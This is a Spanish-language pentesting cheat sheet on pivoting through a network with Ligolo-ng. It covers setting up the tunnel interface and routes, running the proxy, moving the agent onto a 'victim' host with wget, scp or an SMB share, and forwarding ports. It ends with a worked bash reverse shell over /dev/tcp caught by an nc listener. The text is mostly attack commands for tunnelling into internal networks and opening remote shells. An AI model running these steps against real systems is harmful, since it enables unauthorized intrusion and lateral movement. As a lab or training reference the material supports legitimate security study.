# Set-up de la utilidad

>Descargar agente y proxy desde el repo de GitHub: https://github.com/nicocha30/ligolo-ng/releases

>El agente será el que empleemos en las máquinas puente y el proxy en la máquina atacante.

>Para emplearlo deberemos crear una interfaz de red para Ligolo:

```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```
# Uso

>Agregar una ruta al segmento que queremos llegar mediante Ligolo:

```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```

>Activar el proxy en el lado atacante:

```bash
chmod +x ligoloProxy
./ligoloProxy -selfcert
```

>Transferir el archivo agent a la máquina puente a la que debemos tener acceso, **no necesita** de **privilegios elevados** para correr:

```bash
scp ligoloAgent usuario@IP:/tmp --> Mediante SSH
------------------------------------------------
python3 -m http.server 80 --> Atacante
wget http://IP:puerto/ligoloAgent --> Víctima
------------------------------------------------
impacket-smbserver smbFolder $(pwd) -smb2support --> Atacante
copy \\IP\ligoloAgent ligoloAgent --> Víctima Windows
```

>Darle permisos de ejecución al agente:

```bash
chmod +x ligoloAgent
```

>Establecer una conexión entre el agente y el proxy de la máquina atacante:

```bash
./agent -connect IP:puerto -ignore-cert
```

>Si ha funcionado, deberíamos de ver en la ejecución del proxy que un nuevo agente se ha unido y te dirá información acerca del usuario, hostname e dirección IP.

>Creación del túnel entre las sesiones desde la consola de ligolo en el proxy:

```ligolo-ng
session
Elegir sesión entre todas las que salgan con su número y darle a Enter
start
```

>Ahora deberíamos poder tener acceso al segmento de red que anteriormente no podríamos tener acceso mediante la máquina atacante.

>Ahora el único problema es que la máquina víctima no tiene acceso a nosotros aunque nosotros si lo tengamos hacia esta. Esto es un problema para compartido de archivos y reverse shells.

>Para ello deberíamos de realizar un port forwarding:

```ligolo-ng
listener_add --addr 0.0.0.0:puerto --to 127.0.0.1:puerto
listener_list
```

>Esto lo que hará es que en la sesión que nos encontremos nos traeremos el puerto especificado a nuestro puerto deseado en el localhost. 

### Ejemplo práctico de esto con una reverse shell:

>Máquina Atacante --> 10.10.0.1
>Máquina Puente --> 10.10.0.2 192.168.1.1
>Máquina Víctima --> 192.168.1.2

>Máquina Atacante en la sesión de la máquina puente dentro de Ligolo-NG:

```ligolo-ng
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:443
```

```bash
nc -nlvp 443
```

>Máquina Víctima:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.1/8080 0>&1'
```

>El tráfico de la reverse shell sería redirigido por el port forwarding hacia el puerto 443 de la máquina atacante y se podría entablar la reverse shell.
